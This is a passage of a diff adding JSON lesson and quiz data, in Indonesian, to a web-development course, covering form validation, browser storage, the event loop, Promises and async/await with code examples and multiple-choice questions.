+            "id": "q-9-5-2",
+            "question": "Atribut HTML apakah yang WAJIB ada pada setiap elemen <input> agar nilainya dapat dibaca secara otomatis oleh FormData API?",
+            "options": [
+              "atribut name (contoh: name=\"email\")",
+              "atribut class",
+              "atribut style",
+              "atribut placeholder"
+            ],
+            "correctIndex": 0,
+            "explanation": "FormData menggunakan nilai atribut name dari setiap input sebagai kunci (key) dalam pasangan key-value data yang diekstrak."
+          },
+          {
+            "id": "q-9-5-3",
+            "question": "Mengapa validasi di sisi server (server-side validation) tetap WAJIB diterapkan meskipun formulir sudah memiliki validasi frontend yang sangat ketat?",
+            "options": [
+              "Karena validasi client-side di frontend dapat dengan mudah dimatikan atau dilewati oleh peretas (misal via cURL/Postman), sehingga server-side validation adalah dinding pertahanan keamanan mutlak.",
+              "Karena browser mobile tidak mendukung validasi JavaScript.",
+              "Agar ukuran file database menjadi lebih kecil.",
+              "Karena validasi server memperlambat koneksi pengguna."
+            ],
+            "correctIndex": 0,
+            "explanation": "Validasi frontend hanya bertujuan untuk User Experience (UX), sedangkan validasi backend adalah proteksi integritas data dan keamanan sistem yang tidak boleh dilewati."
+          }
+        ]
+      },
+      {
+        "id": "lesson-9-6",
+        "stageId": "stage-9",
+        "slug": "browser-storage-localstorage-sessionstorage-cookies",
+        "title": "Browser Storage: localStorage, sessionStorage & Cookies",
+        "titleEn": "Browser Storage Systems",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Menyimpan data di browser client: localStorage (persisten), sessionStorage (per tab), Cookies (otentikasi HTTP), dan serialisasi JSON.stringify / JSON.parse.",
+        "prerequisites": [
+          "form-handling-dan-client-side-validation"
+        ],
+        "learningObjectives": [
+          "Membedakan karakteristik masa hidup dan kapasitas penyimpanan antara localStorage, sessionStorage, dan Cookies.",
+          "Menyimpan dan membaca data kompleks (objek/array) menggunakan JSON.stringify() dan JSON.parse().",
+          "Memahami batasan keamanan (jangan menyimpan token sensitif di localStorage jika rentan XSS)."
+        ],
+        "whyMatters": "Menyimpan preferensi Dark Mode, item keranjang belanja offline, dan data form draft memerlukan penyimpanan lokal di browser.",
+        "careerContext": "State persistence di aplikasi modern (seperti persist middleware pada Zustand) dibangun di atas localStorage API ini.",
+        "commonMistakes": [
+          "Lupa melakukan `JSON.stringify` saat menyimpan objek, sehingga yang tersimpan di localStorage adalah string rusak `\"[object Object]\"`.",
+          "Menyimpan password akun atau API secret key di localStorage."
+        ],
+        "keyTerms": [
+          {
+            "term": "localStorage",
+            "definition": "Penyimpanan lokal per-origin berkapasitas ~5MB yang bertahan permanen bahkan setelah browser ditutup."
+          },
+          {
+            "term": "sessionStorage",
+            "definition": "Penyimpanan lokal yang otomatis terhapus saat tab atau jendela browser ditutup."
+          },
+          {
+            "term": "Cookies",
+            "definition": "Penyimpanan kecil (~4KB) yang otomatis dikirimkan oleh browser pada setiap HTTP header request ke server."
+          },
+          {
+            "term": "JSON.stringify / JSON.parse",
+            "definition": "Fungsi untuk mengubah objek JS menjadi string JSON dan mengembalikannya lagi menjadi objek."
+          }
+        ],
+        "contentMd": "# Browser Storage: localStorage, sessionStorage & Cookies\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari 3 mekanisme penyimpanan data di sisi browser pengguna: **`localStorage`** (permanen), **`sessionStorage`** (sementara per tab), dan **`Cookies`** (terkait request server), serta serialisasi **JSON**.\n\n## Mengapa Konsep Ini Penting?\nSaat pengguna memilih \"Mode Gelap\", bagaimana cara memastikan website tetap tampil dalam mode gelap saat mereka membuka kembali website tersebut minggu depan? Data preferensi tersebut disimpan di penyimpanan lokal browser.\n\n## 1. Perbandingan 3 Mekanisme Penyimpanan\n\n| Kriteria | `localStorage` | `sessionStorage` | `Cookies` |\n| :--- | :--- | :--- | :--- |\n| **Masa Hidup Data** | **Permanen** (Hingga dihapus kode/user) | **Hilang saat tab ditutup** | Dibatasi waktu kadaluarsa (*Expires*) |\n| **Kapasitas** | **~5 MB** per domain | **~5 MB** per domain | **~4 KB** |\n| **Terkirim ke Server?**| **TIDAK** (Hanya di client) | **TIDAK** (Hanya di client) | **YA** (Otomatis di setiap HTTP header) |\n| **Kasus Penggunaan** | Tema Gelap/Terang, draft form | Data formulir multi-step | Token Auth Session (`HttpOnly`) |\n\n## 2. Operasi Dasar `localStorage` & `sessionStorage`\nKeduanya memiliki API method yang persis sama:\n\n```javascript\n// 1. Menyimpan data string sederhana\nlocalStorage.setItem(\"tema\", \"dark\");\n\n// 2. Membaca data\nconst temaAktif = localStorage.getItem(\"tema\"); // \"dark\"\n\n// 3. Menghapus satu item\nlocalStorage.removeItem(\"tema\");\n\n// 4. Menghapus seluruh data domain\nlocalStorage.clear();\n```\n\n## 3. Menyimpan Objek/Array dengan Serialisasi JSON\n`localStorage` **HANYA bisa menyimpan data dalam bentuk STRING**. Jika Anda menyimpan objek langsung, data akan rusak menjadi `\"[object Object]\"`.\n\n```javascript\nconst preferensiUser = {\n  volume: 80,\n  bahasa: \"id\",\n  notifikasi: true\n};\n\n// SIMPAN: Ubah Objek -> String JSON\nlocalStorage.setItem(\"user_settings\", JSON.stringify(preferensiUser));\n\n// BACA: Ambil String -> Kembalikan jadi Objek Asli\nconst dataTersimpan = localStorage.getItem(\"user_settings\");\nif (dataTersimpan) {\n  const preferensi = JSON.parse(dataTersimpan);\n  console.log(preferensi.volume); // 80 (Tipe Number yang valid!)\n}\n```\n\n## Kesalahan Umum Pemula\n- **Menyimpan data sensitif**: Jangan pernah menyimpan nomor kartu kredit, password mentah, atau token otentikasi rahasia di `localStorage` jika website Anda belum bersih dari celah XSS.\n\n## Praktik Mandiri\n1. Simpan array `const keranjang = ['Buku', 'Pensil']` ke `localStorage` menggunakan `JSON.stringify`.\n2. Buka Chrome DevTools $\\rightarrow$ Tab **Application** $\\rightarrow$ **Local Storage** dan lihat datanya tersimpan nyata di sana.\n\n## Ringkasan\n- **`localStorage`** menyimpan data persisten (~5MB) yang tidak hilang saat browser ditutup.\n- **`sessionStorage`** menyimpan data sementara yang terhapus saat tab ditutup.\n- **`Cookies`** berukuran kecil (~4KB) dan otomatis ikut dikirim ke server pada setiap request.\n- Selalu gunakan **`JSON.stringify()`** saat menyimpan objek dan **`JSON.parse()`** saat membacanya kembali.",
+        "quizzes": [
+          {
+            "id": "q-9-6-1",
+            "question": "Apa perbedaan masa hidup data yang tersimpan di localStorage dibandingkan dengan sessionStorage?",
+            "options": [
+              "Data di localStorage bertahan permanen sampai dihapus manual oleh user/kode, sedangkan data di sessionStorage otomatis terhapus saat tab/jendela browser ditutup.",
+              "localStorage hilang setiap 1 jam sedangkan sessionStorage permanen.",
+              "sessionStorage hanya untuk server sedangkan localStorage untuk database.",
+              "Keduanya otomatis terhapus setiap 5 menit."
+            ],
+            "correctIndex": 0,
+            "explanation": "localStorage memiliki persistensi permanen lintas sesi browser, sedangkan sessionStorage terikat pada masa hidup satu tab browser individual."
+          },
+          {
+            "id": "q-9-6-2",
+            "question": "Mengapa kita wajib menggunakan JSON.stringify() saat menyimpan array atau objek ke dalam localStorage?",
+            "options": [
+              "Karena localStorage hanya dapat menyimpan data dalam format teks string, jika tidak di-stringify objek akan rusak tersimpan sebagai string '[object Object]'.",
+              "Untuk mengompresi data menjadi file ZIP.",
+              "Karena localStorage menolak huruf alfabet.",
+              "Untuk mengenkripsi data dengan standar militer."
+            ],
+            "correctIndex": 0,
+            "explanation": "Penyimpanan browser storage berbasis string kunci-nilai murni sehingga objek/array harus diserialisasi menjadi string JSON sebelum disimpan."
+          },
+          {
+            "id": "q-9-6-3",
+            "question": "Manakah karakteristik utama dari Cookies dibandingkan dengan localStorage?",
+            "options": [
+              "Cookies berukuran kecil (~4KB) dan otomatis disertakan oleh browser pada setiap HTTP request header ke server, ideal untuk sesi otentikasi (terutama dengan flag HttpOnly).",
+              "Cookies memiliki kapasitas raksasa hingga 1 GB.",
+              "Cookies tidak bisa dibaca oleh server backend.",
+              "Cookies hanya berlaku pada hari Minggu."
+            ],
+            "correctIndex": 0,
+            "explanation": "Cookies dirancang untuk komunikasi sesi client-server dan secara otomatis dilampirkan browser pada setiap HTTP request header."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-10",
+    "orderIndex": 10,
+    "titleId": "Asynchronous JavaScript, Promises & Fetch API",
+    "titleEn": "Asynchronous JavaScript, Promises & Fetch API",
+    "category": "Frontend",
+    "description": "Memahami model eksekusi Asynchronous, Event Loop, Call Stack, Task Queue, Microtasks, Promises, async/await, Fetch API, dan Error Handling.",
+    "descriptionEn": "Master Asynchronous execution, Event Loop, Call Stack, Microtasks, Promises, async/await, Fetch API, and robust error handling.",
+    "lessons": [
+      {
+        "id": "lesson-10-1",
+        "stageId": "stage-10",
+        "slug": "asynchronous-model-dan-event-loop",
+        "title": "Asynchronous Model & Event Loop (Call Stack, Task Queue, Microtasks)",
+        "titleEn": "Asynchronous JS & Event Loop Internals",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Membedah arsitektur runtime JavaScript: Single-Threaded Non-Blocking I/O, Call Stack, Web APIs, Macrotask Queue vs Microtask Queue (Promise priority).",
+        "prerequisites": [
+          "browser-storage-localstorage-sessionstorage-cookies"
+        ],
+        "learningObjectives": [
+          "Menjelaskan sifat Single-Threaded dan Non-Blocking I/O pada JavaScript runtime.",
+          "Menganalisis alur eksekusi komponen Event Loop: Call Stack, Web APIs, Microtask Queue, dan Macrotask Queue.",
+          "Memprediksi urutan output console pada kombinasi synchronous code, setTimeout, dan Promise.then (Microtask priority).",
+          "Mencegah pemblokiran Call Stack akibat operasi komputasi sinkron yang terlalu berat."
+        ],
+        "whyMatters": "Memahami Event Loop menghilangkan kebingungan terbesar developer: mengapa baris kode di bawah `setTimeout(..., 0)` dieksekusi lebih dulu daripada isi callback-nya.",
+        "careerContext": "Arsitektur Event Loop adalah topik wawancara teknis tingkat lanjut paling standar untuk posisi Mid/Senior Frontend Developer.",
+        "commonMistakes": [
+          "Mengira `setTimeout(fn, 0)` akan dieksekusi seketika (ia tetap harus mengantre di Task Queue dan menunggu Call Stack kosong).",
+          "Menjalankan perulangan sinkron 1 miliar iterasi yang membekukan seluruh browser."
+        ],
+        "keyTerms": [
+          {
+            "term": "Single-Threaded",
+            "definition": "Karakteristik JavaScript yang hanya memiliki 1 jalur eksekusi (Call Stack) pada satu waktu."
+          },
+          {
+            "term": "Call Stack",
+            "definition": "Struktur data LIFO (Last In First Out) tempat frame eksekusi fungsi yang sedang aktif dijalankan."
+          },
+          {
+            "term": "Event Loop",
+            "definition": "Mekanisme pengawas konstan yang memindahkan tugas dari Queue ke Call Stack saat Stack dalam keadaan kosong."
+          },
+          {
+            "term": "Microtask Queue",
+            "definition": "Antrean prioritas tinggi untuk Promise callbacks yang selalu dikosongkan sebelum Macrotask."
+          }
+        ],
+        "contentMd": "# Asynchronous Model & Event Loop (Call Stack, Task Queue, Microtasks)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan membedah mesin internal runtime JavaScript: bagaimana JavaScript yang bersifat **Single-Threaded** dapat menjalankan tugas latar belakang tanpa macet menggunakan arsitektur **Call Stack**, **Web APIs**, **Microtask Queue**, **Macrotask Queue**, dan **Event Loop**.\n\n## Mengapa Konsep Ini Penting?\nPernahkah Anda heran melihat kode ini:\n```javascript\nconsole.log(\"1\");\nsetTimeout(() => console.log(\"2\"), 0);\nconsole.log(\"3\");\n// Output: 1, 3, 2 (Mengapa angka 2 muncul belakangan padahal delay-nya 0 detik?)\n```\nJawabannya terletak pada cara kerja **Event Loop**.\n\n## 1. Anatomi Runtime JavaScript\n\n```text\n┌─────────────────────────────────────────────────────────────┐\n│  JAVASCRIPT ENGINE                                          │\n│  ┌───────────────────┐        ┌──────────────────────────┐  │\n│  │   MEMORY HEAP     │        │        CALL STACK        │  │\n│  │ (Alokasi Objek)   │        │ (Eksekusi 1 Baris Utama) │  │\n│  └───────────────────┘        └────────────┬─────────────┘  │\n└────────────────────────────────────────────┼────────────────┘\n                                             │ Web API Delegasi\n                                             ▼\n┌─────────────────────────────────────────────────────────────┐\n│  BROWSER WEB APIs (Timer setTimeout, Fetch HTTP, DOM Events)│\n└────────────────────────────────────────────┬────────────────┘\n                                             │ Selesai & Kirim Callback\n                                             ▼\n┌─────────────────────────────────────────────────────────────┐\n│  QUEUES (Antrean Callback)                                  │\n│  ┌───────────────────────────────────────────────────────┐  │\n│  │ 1. MICROTASKS (Prioritas Tertinggi: Promise.then, etc)│  │\n│  ├───────────────────────────────────────────────────────┤  │\n│  │ 2. MACROTASKS (Prioritas Biasa: setTimeout, setInterval)││\n│  └───────────────────────────────────────────────────────┘  │\n└────────────────────────────────────────────┬────────────────┘\n                                             │\n                                     EVENT LOOP MEMERIKSA:\n                     \"Apakah Call Stack KOSONG? Jika YA, dorong antrean!\"\n```\n\n## 2. Hierarki Prioritas: Microtasks vs Macrotasks\nEvent loop memiliki aturan ketat:\n1. Jalankan semua kode sinkron di **Call Stack** hingga tuntas.\n2. Sebelum mengambil Macrotask berikutnya, **KOSONGKAN SELURUH MICROTASKS** terlebih dahulu!\n- **Microtasks (Prioritas Tinggi)**: `Promise.then()`, `catch()`, `finally()`, `queueMicrotask()`.\n- **Macrotasks (Prioritas Normal)**: `setTimeout()`, `setInterval()`, `setImmediate()`.\n\n### Contoh Uji Logika Event Loop:\n```javascript\nconsole.log(\"A: Sinkron Awal\");\n\nsetTimeout(() => {\n  console.log(\"B: Macrotask (setTimeout)\");\n}, 0);\n\nPromise.resolve().then(() => {\n  console.log(\"C: Microtask (Promise)\");\n});\n\nconsole.log(\"D: Sinkron Akhir\");\n\n// URUTAN KELUARAN YANG TEPAT:\n// 1. \"A: Sinkron Awal\"  (Call Stack)\n// 2. \"D: Sinkron Akhir\"  (Call Stack)\n// 3. \"C: Microtask\"      (Microtask Queue dikosongkan sebelum Macrotask)\n// 4. \"B: Macrotask\"      (Macrotask Queue)\n```\n\n## Kesalahan Umum Pemula\n- **Mengira setTimeout menjamin waktu persis**: `setTimeout(fn, 1000)` bukan berarti tepat 1000ms eksekusi berjalan, melainkan *minimal 1000ms* baru callback dimasukkan ke antrean dan menunggu gilirannya jika Call Stack sedang sibuk.\n\n## Praktik Mandiri\n1. Jalankan contoh kode 4 baris di atas di console browser Anda.\n2. Amati urutan kemunculan teks dan buktikan kemenangan Microtask atas Macrotask.\n\n## Ringkasan\n- JavaScript bersifat **Single-Threaded** (1 Call Stack pada satu waktu).\n- Operasi lambat (timer, fetch network) didelegasikan ke **Web APIs** browser.\n- **Event Loop** memindahkan callback dari antrean ke Call Stack saat stack kosong.\n- **Microtasks (Promise)** selalu diproses lebih dulu dengan prioritas tertinggi sebelum **Macrotasks (setTimeout)**.",
+        "quizzes": [
+          {
+            "id": "q-10-1-1",
+            "question": "Perhatikan cuplikan kode berikut:\nconsole.log('1');\nsetTimeout(() => console.log('2'), 0);\nPromise.resolve().then(() => console.log('3'));\nconsole.log('4');\nManakah urutan keluaran console yang benar?",
+            "options": [
+              "1, 4, 3, 2",
+              "1, 2, 3, 4",
+              "1, 3, 2, 4",
+              "4, 3, 2, 1"
+            ],
+            "correctIndex": 0,
+            "explanation": "Kode sinkron (1, 4) berjalan langsung di Call Stack. Lalu Microtask Promise (3) diproses sebelum Macrotask setTimeout (2)."
+          },
+          {
+            "id": "q-10-1-2",
+            "question": "Apa tugas utama dari mekanisme Event Loop pada JavaScript runtime?",
+            "options": [
+              "Memantau Call Stack secara terus-menerus; jika Call Stack kosong, Event Loop akan mengambil callback dari antrean (Queue) dan mendorongnya ke Call Stack untuk dieksekusi.",
+              "Menerjemahkan kode JavaScript menjadi file binary .exe.",
+              "Mengompresi gambar dan media video di halaman web.",
+              "Mengatur koneksi database SQL."
+            ],
+            "correctIndex": 0,
+            "explanation": "Event Loop bertindak sebagai pengatur lalu lintas yang memindahkan tugas asinkron dari Task Queue ke Call Stack saat Stack sudah bersih kosong."
+          },
+          {
+            "id": "q-10-1-3",
+            "question": "Mengapa callback dari Promise.then() dieksekusi lebih dulu daripada callback setTimeout(..., 0)?",
+            "options": [
+              "Karena Promise callbacks ditempatkan di Microtask Queue yang memiliki prioritas lebih tinggi dan harus dikosongkan sebelum Event Loop memproses Macrotask Queue (setTimeout).",
+              "Karena Promise ditulis dalam bahasa C++.",
+              "Karena setTimeout sengaja ditunda oleh browser selama 1 menit.",
+              "Karena Promise tidak menggunakan memori komputer."
+            ],
+            "correctIndex": 0,
+            "explanation": "Microtask Queue (Promise) selalu dieksekusi dan dikosongkan tuntas pada setiap pergantian frame sebelum Macrotask (setTimeout) diambil."
+          }
+        ]
+      },
+      {
+        "id": "lesson-10-2",
+        "stageId": "stage-10",
+        "slug": "promises-states-chaining-dan-error-handling",
+        "title": "Promises: States, Chaining (.then, .catch, .finally)",
+        "titleEn": "JavaScript Promises: States & Chaining",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Memahami 3 status Promise (Pending, Fulfilled, Rejected), membuat Promise baru (new Promise), chaining .then(), penanganan error dengan .catch(), dan cleanup dengan .finally().",
+        "prerequisites": [
+          "asynchronous-model-dan-event-loop"
+        ],
+        "learningObjectives": [
+          "Mengidentifikasi 3 status siklus hidup Promise: Pending, Fulfilled, dan Rejected.",
+          "Membuat custom Promise menggunakan konstruktor new Promise((resolve, reject) => {}).",
+          "Merangkai operasi asinkron berurutan menggunakan Promise Chaining (.then).",
+          "Menangkap kegagalan jaringan dengan .catch() dan menjalankan pembersihan UI dengan .finally()."
+        ],
+        "whyMatters": "Promises memecahkan masalah mimpi buruk 'Callback Hell' (kode segitiga bertumpuk piramida) pada JavaScript lawas.",
+        "careerContext": "Semua library modern, SDK database, dan Web API (seperti Fetch) mengembalikan objek Promise.",
+        "commonMistakes": [
+          "Lupa me-return Promise di dalam blok `.then()`, sehingga rantai chaining di bawahnya menerima `undefined`.",
+          "Tidak menyertakan blok `.catch()`, memicu peringatan berbahaya `UnhandledPromiseRejection`."
+        ],
+        "keyTerms": [
+          {
+            "term": "Promise",
+            "definition": "Objek yang mewakili penyelesaian atau kegagalan sebuah operasi asinkron di masa mendatang beserta nilai hasilnya."
+          },
+          {
+            "term": "Pending",
+            "definition": "Status awal Promise saat operasi asinkron masih sedang berjalan dan belum selesai."
+          },
+          {
+            "term": "Fulfilled",
+            "definition": "Status sukses di mana Promise berhasil diselesaikan dengan nilai hasil (resolve)."
+          },
+          {
+            "term": "Rejected",
+            "definition": "Status gagal di mana Promise mengalami error atau ditolak (reject)."
+          }
+        ],
+        "contentMd": "# Promises: States, Chaining (.then, .catch, .finally)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **JavaScript Promises**: 3 status status siklus hidup (**Pending, Fulfilled, Rejected**), cara membuat Promise baru, merangkai operasi berurutan dengan **Chaining (`.then`)**, serta menangani error dengan **`.catch`** dan **`.finally`**.\n\n## Mengapa Konsep Ini Penting?\nSebelum adanya Promise, menjalankan 3 operasi asinkron berurutan membutuhkan callback bersarang yang membentuk piramida berantakan (*Callback Hell*):\n```javascript\n// MASA KELAM: Callback Hell (Pyramid of Doom)\nambilUser(id, function(user) {\n  ambilPesanan(user, function(pesanan) {\n    hitungTotal(pesanan, function(total) {\n      // Kode bergeser terus ke kanan dan sangat sulit dirawat!\n    });\n  });\n});\n```\nPromises diciptakan untuk mengubah piramida rumit tersebut menjadi rantai lurus yang rapi dan elegan.\n\n## 1. Tiga Status Siklus Hidup Promise\n\n```text\n                    ┌───> [ FULFILLED ] ---> .then(hasil)\n[ PENDING ] ────────┤\n (Sedang Berjalan)  └───> [ REJECTED ]  ---> .catch(error)\n                                              └───> .finally() (Selalu Berjalan)\n```\n\n1. **Pending**: Operasi sedang berjalan (belum selesai).\n2. **Fulfilled (Resolved)**: Operasi berhasil diselesaikan dengan membawa nilai sukses.\n3. **Rejected**: Operasi gagal atau menghasilkan error.\n\n## 2. Membuat Custom Promise dengan `new Promise`\n\n```javascript\nfunction simulasiUnduhData(sukses) {\n  return new Promise((resolve, reject) => {\n    setTimeout(() => {\n      if (sukses) {\n        resolve({ id: 1, nama: \"Data Kursus BelajarinAja\" });\n      } else {\n        reject(new Error(\"Koneksi server terputus!\"));\n      }\n    }, 1000);\n  });\n}\n```\n\n## 3. Promise Chaining & Error Handling\n\n```javascript\n// Menampilkan status loading\nconsole.log(\"Loading dimulai...\");\n\nsimulasiUnduhData(true)\n  .then((data) => {\n    console.log(\"1. Data Diterima:\", data.nama);\n    // Kembalikan data baru atau Promise lain untuk dirantai:\n    return data.id;\n  })\n  .then((id) => {\n    console.log(\"2. Memproses rincian untuk ID:\", id);\n  })\n  .catch((err) => {\n    // Menangkap error jika ADA tahap yang gagal:\n    console.error(\"Terjadi Kegagalan:\", err.message);\n  })\n  .finally(() => {\n    // SELALU berjalan di akhir, baik sukses maupun gagal (Cocok untuk matikan loading):\n    console.log(\"Loading selesai (Cleanup).\");\n  });\n```\n\n## Kesalahan Umum Pemula\n- **Membiarkan Unhandled Rejection**: Tidak menyertakan handler `.catch()` saat memanggil Promise. Jika terjadi error jaringan, aplikasi dapat mengalami silent failure atau unhandled crash.\n\n## Praktik Mandiri\n1. Buat Promise yang me-resolve string \"Berhasil!\" setelah jeda waktu 1 detik.\n2. Panggil dengan `.then(console.log)` dan tambahkan `.finally(() => console.log(\"Selesai\"))`.\n\n## Ringkasan\n- Promise memiliki 3 status: **Pending**, **Fulfilled**, dan **Rejected**.\n- Gunakan **`.then()`** untuk menangani data saat berhasil.\n- Gunakan **`.catch()`** untuk menangani kegagalan/error.\n- Gunakan **`.finally()`** untuk membersihkan UI (seperti mematikan spinner loading) terlepas dari hasil operasi.",
+        "quizzes": [
+          {
+            "id": "q-10-2-1",
+            "question": "Manakah 3 status resmi (States) dari sebuah objek Promise di JavaScript?",
+            "options": [
+              "Pending, Fulfilled, Rejected",
+              "Starting, Processing, Finished",
+              "Waiting, Success, Crash",
+              "Open, Resolved, Closed"
+            ],
+            "correctIndex": 0,
+            "explanation": "ECMAScript mendefinisikan 3 status siklus hidup Promise: Pending (sedang berjalan), Fulfilled (berhasil/resolved), dan Rejected (gagal)."
+          },
+          {
+            "id": "q-10-2-2",
+            "question": "Kapan blok .finally() pada sebuah Promise akan dieksekusi oleh JavaScript engine?",
+            "options": [
+              "Selalu dieksekusi di akhir setelah Promise selesai, terlepas dari apakah hasilnya sukses (Fulfilled) ataupun gagal (Rejected).",
+              "Hanya saat Promise mengalami kegagalan/error.",
+              "Hanya saat Promise berhasil diselesaikan.",
+              "Hanya jika koneksi internet terputus."
+            ],
+            "correctIndex": 0,
+            "explanation": ".finally() dijamin selalu berjalan di akhir siklus untuk keperluan cleanup seperti mematikan indikator loading spinner."
+          },
+          {
+            "id": "q-10-2-3",
+            "question": "Masalah arsitektur apakah pada JavaScript lawas yang berhasil diatasi dengan kehadiran sintaks Promise Chaining?",
+            "options": [
+              "Callback Hell (Pyramid of Doom): tumpukan callback bersarang yang bergeser ke kanan dan sangat sulit dibaca serta dirawat.",
+              "Kekurangan memori RAM pada kartu grafis.",
+              "Larangan penggunaan bahasa CSS.",
+              "Keharusan menginstal file compiler eksternal."
+            ],
+            "correctIndex": 0,
+            "explanation": "Promises menggantikan callback bertingkat yang rawan bug dengan rantai linear .then() yang mudah dibaca dan memiliki penanganan error terpusat."
+          }
+        ]
+      },
+      {
+        "id": "lesson-10-3",
+        "stageId": "stage-10",
+        "slug": "async-await-dan-try-catch-error-handling",
+        "title": "Async / Await & Robust Error Handling (try-catch)",
+        "titleEn": "Async / Await & Error Handling",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 15,
+        "description": "Menulis kode asinkron dengan gaya sinkron yang bersih menggunakan async/await, penanganan error dengan blok try-catch-finally, dan pembongkaran error objek.",
+        "prerequisites": [
+          "promises-states-chaining-dan-error-handling"
+        ],
+        "learningObjectives": [
+          "Mendeklarasikan fungsi asinkron menggunakan kata kunci async dan menjeda resolusi dengan await.",
+          "Membungkus operasi asinkron dalam blok try-catch-finally untuk penanganan error yang kuat.",
+          "Menjelaskan bahwa fungsi ber-prefix async SELALU mengembalikan sebuah objek Promise.",
+          "Mencegah unhandled rejection dan memelihara keterbacaan kode bersih."
+        ],
+        "whyMatters": "`async/await` adalah standar penulisan kode asinkron modern di seluruh industri saat ini, membuat kode tampak bersih seperti kode sekuensial sinkron.",
+        "careerContext": "Lebih dari 95% kode data fetching di React, Next.js Server Components, dan Node.js ditulis menggunakan pola `async/await`.",
+        "commonMistakes": [
+          "Menggunakan kata kunci `await` di luar fungsi `async` pada lingkungan modul non-top-level.",
+          "Lupa bahwa `await` hanya menjeda eksekusi internal di dalam fungsi lokal tersebut, BUKAN memblokir Main Thread browser."
+        ],
+        "keyTerms": [
+          {
+            "term": "async",
+            "definition": "Kata kunci penanda bahwa suatu fungsi bersifat asinkron dan otomatis mengembalikan Promise."
+          },
+          {
+            "term": "await",
+            "definition": "Operator yang menjeda eksekusi fungsi async hingga Promise yang ditunggu berstatus settled (fulfilled/rejected)."
+          },
+          {
+            "term": "try-catch-finally",
+            "definition": "Struktur penanganan error terstruktur untuk menangkap pengecualian (*exceptions*) secara aman."
+          }
+        ],
+        "contentMd": "# Async / Await & Robust Error Handling (try-catch)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari sintaks penulisan kode asinkron modern paling disukai developer: **`async/await`** (Syntactic Sugar di atas Promise) yang dipadukan dengan blok penanganan error **`try-catch-finally`**.\n\n## Mengapa Konsep Ini Penting?\nMeskipun `.then()` sudah jauh lebih baik dari callback, menulis banyak rantai `.then()` yang bertingkat tetap bisa membingungkan. `async/await` memungkinkan Anda menulis kode asinkron dengan **gaya sekuensial baris demi baris layaknya kode sinkron biasa**.\n\n## 1. Konsep Dasar `async` dan `await`\n- **`async`**: Diletakkan di depan deklarasi fungsi. Menjamin bahwa fungsi tersebut **selalu mengembalikan Promise**.\n- **`await`**: Diletakkan di depan pemanggilan Promise. Menjeda eksekusi baris berikutnya di dalam fungsi tersebut sampai Promise selesai diselesaikan (*settled*).\n\n```javascript\n// 1. Fungsi Asinkron Mengambil Data Pengguna\nasync function ambilDataPengguna(userId) {\n  // await menghentikan baris ini hingga Promise resolve dan mengembalikan nilainya langsung:\n  const respon = await fetchUserFromDB(userId);\n  return respon;\n}\n```\n\n## 2. Pola Penanganan Error Profesional: `try-catch-finally`\nJika Promise yang di-`await` mengalami penolakan (*reject*), JavaScript akan melempar *exception*. Tangkap error tersebut secara aman menggunakan blok **`try-catch`**:\n\n```javascript\nasync function muatDashboard() {\n  let isLoading = true;\n  console.log(\"Status Loading:\", isLoading);\n\n  try {\n    console.log(\"Memulai request data...\");\n    \n    // Baris ini menunggu hingga selesai:\n    const dataUser = await ambilDataPengguna(101);\n    console.log(\"Data Berhasil Dimuat:\", dataUser.nama);\n    \n    const dataStatistik = await ambilStatistik(dataUser.id);\n    console.log(\"Statistik:\", dataStatistik);\n\n  } catch (error) {\n    // Tangkap jika terjadi kegagalan jaringan atau server down:\n    console.error(\"Gagal memuat dashboard:\", error.message);\n    tampilkanBannerError(\"Koneksi gagal. Silakan coba lagi.\");\n\n  } finally {\n    // SELALU berjalan di akhir:\n    isLoading = false;\n    console.log(\"Status Loading Selesai:\", isLoading);\n  }\n}\n```\n\n## 3. Keunggulan `async/await` dibanding `.then()`\n1. **Sangat Mudah Dibaca**: Alur kode berjalan lurus dari atas ke bawah tanpa tanda kurung bertingkat.\n2. **Debugging Mudah**: Stack trace error menunjuk tepat ke nomor baris yang bermasalah.\n3. **Penanganan Error Terpusat**: Satu blok `catch` dapat menangani error dari 5 operasi `await` sekaligus.\n\n## Kesalahan Umum Pemula\n- **Lupa kata kunci `async`**: Menggunakan `await` di dalam fungsi biasa yang tidak diberi label `async` akan memicu `SyntaxError: await is only valid in async functions`.\n\n## Praktik Mandiri\n1. Buat fungsi async `tungguDanSapa(nama)` yang menunggu `new Promise(r => setTimeout(r, 1000))` lalu mencetak \"Halo, [nama]!\".\n2. Bungkus pemanggilan fungsi tersebut di dalam blok `try-catch`.\n\n## Ringkasan\n- Fungsi **`async`** otomatis mengembalikan sebuah Promise.\n- Kata kunci **`await`** menjeda eksekusi fungsi hingga Promise selesai tanpa memblokir browser thread.\n- Selalu bungkus operasi `await` di dalam blok **`try-catch-finally`** untuk penanganan error yang kokoh dan aman.",
+        "quizzes": [
+          {
+            "id": "q-10-3-1",
+            "question": "Apa yang selalu dikembalikan oleh sebuah fungsi yang dideklarasikan dengan kata kunci async?",
+            "options": [
+              "Fungsi async SELALU mengembalikan sebuah objek Promise (yang membungkus nilai return-nya).",
+              "Mengembalikan string teks biasa.",
+              "Mengembalikan nilai undefined tanpa terkecuali.",
+              "Mengembalikan array kosong."
+            ],
+            "correctIndex": 0,
+            "explanation": "Setiap fungsi async di JavaScript secara otomatis membungkus nilai kembaliannya ke dalam objek Promise."
+          },
+          {
+            "id": "q-10-3-2",
+            "question": "Bagaimana cara menangkap error atau kegagalan Promise yang dipanggil menggunakan sintaks await?",
+            "options": [
+              "Membungkus baris pemanggilan await di dalam blok try { ... } catch (error) { ... }.",
+              "Menggunakan statement if (await === error).",
+              "Error pada await tidak bisa ditangkap.",
+              "Menuliskan kata kunci ignore-error."
+            ],
+            "correctIndex": 0,
+            "explanation": "Struktur standar try-catch menangkap rejected Promise yang di-await persis seperti menangkap exception sinkron reguler."
+          },
+          {
+            "id": "q-10-3-3",
+            "question": "Di manakah kata kunci await diizinkan untuk digunakan di dalam kode JavaScript?",
+            "options": [
+              "Hanya di dalam fungsi yang dideklarasikan dengan kata kunci async (atau di level teratas ES Modules / Top-Level Await).",
